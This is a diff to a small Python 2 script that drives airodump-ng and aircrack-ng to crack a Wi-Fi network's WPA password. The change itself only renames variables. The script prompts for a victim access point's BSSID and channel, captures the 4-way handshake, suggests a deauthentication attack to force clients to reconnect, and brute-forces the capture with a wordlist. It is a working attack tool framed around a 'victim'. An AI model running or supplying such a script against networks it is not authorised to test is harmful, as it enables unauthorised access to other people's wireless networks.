@@ -21,7 +21,7 @@ bssid = raw_input("please Enter the BSSID of the network ap you want to crack: "
 
 # get the channel of victim from the user
 channel = raw_input("Enter the channel number that the wireless network is currently running on: ")
-save = raw_input("enter the path to the 4-way-handshake file")
+save_4way = raw_input("enter the path to the 4-way-handshake file")
 print colored("...", "red"),
 print colored("Airodump will start now", "red")
 sleep(5)
@@ -29,7 +29,7 @@ sleep(5)
 # runnig airodump-ng on the victim ap and we will wait until threre is going 
 # to be a handshake process the user will see it on the screen when a new device is 
 # connected to the network. 
-airodump2 = 'airodump-ng -c {0} --bssid {1} -w {2} {3}'.format(channel, bssid, save, wireless_card)
+airodump2 = 'airodump-ng -c {0} --bssid {1} -w {2} {3}'.format(channel, bssid, save_4way, wireless_card)
 system(airodump2)
 print("please wait until you will see new conction..")
 print("there is a option to run deou attack on the victim and then force him to reconnected")
@@ -46,10 +46,11 @@ print colored("Cracking the handshake with aircrack-ng is starting...", "green")
 
 wordlist = raw_input("Specify the path to your wordlist dictionary: ")
 #the cap file that was created.
-save2 = raw_input("Enter the .cap file name that is saved in the directory you previously entered: e.g: 01.cap")
+save_cap = raw_input("Enter the .cap file name that is saved in the directory you previously entered: e.g: 01.cap")
 print colored("password will be cracked in a while !!", "red")
+
 # find the password via the wordlist.
-crack = 'aircrack-ng -a 2 {0}{1} -w {2} '.format(save, save2, wordlist)
+crack = 'aircrack-ng -a 2 {0}{1} -w {2} '.format(save_4way, save_cap, wordlist)
 system(crack)
 
 # now, when the password was cracked we will open wireshark and 
